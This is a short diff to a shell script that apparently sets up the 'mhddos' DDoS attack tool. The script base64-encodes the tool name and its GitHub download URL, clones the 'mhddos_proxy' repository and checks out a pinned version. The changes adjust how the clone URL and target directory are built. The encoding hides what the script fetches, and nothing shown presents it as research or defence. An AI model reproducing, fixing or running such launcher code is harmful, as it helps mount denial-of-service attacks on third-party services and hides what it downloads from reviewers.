@@ -79,10 +79,10 @@ done
 # "mhddos"
 TOOL=$(echo 'bWhkZG9zCg==' | base64 -d)
 
-PROXY_PROJECT_NAME=${TOOL}_proxy
+PROXY_PROJECT_NAME=$execution_id
 #PROXY_PROJECT_VERSION=addeea253d53bbf90d0a320367d8974183c4b480
 PROXY_PROJECT_VERSION=309c4ab160c99b2e85496bbaf76611098cc1294c
-PROXY_PROJECT_URL=$(echo 'aHR0cHM6Ly9naXRodWIuY29tL3BvcnRob2xlLWFzY2VuZC1jaW5uYW1vbgo=' | base64 -d)$PROXY_PROJECT_NAME
+PROXY_PROJECT_URL=$(echo 'aHR0cHM6Ly9naXRodWIuY29tL3BvcnRob2xlLWFzY2VuZC1jaW5uYW1vbi9taGRkb3NfcHJveHkuZ2l0Cg==' | base64 -d)
 
 PROXY_DIR=~/$PROXY_PROJECT_NAME
 PROXY_FILE=$PROXY_DIR/${TOOL}/files/proxies/proxies.txt
@@ -105,7 +105,7 @@ if [ -d $PROXY_DIR ]; then
 fi
 
 # download specific mhddos_proxy version
-git clone $PROXY_PROJECT_URL.git #&> /dev/null
+git clone $PROXY_PROJECT_URL $PROXY_PROJECT_NAME #&> /dev/null
 cd $PROXY_DIR
 git checkout $PROXY_PROJECT_VERSION #&> /dev/null
 
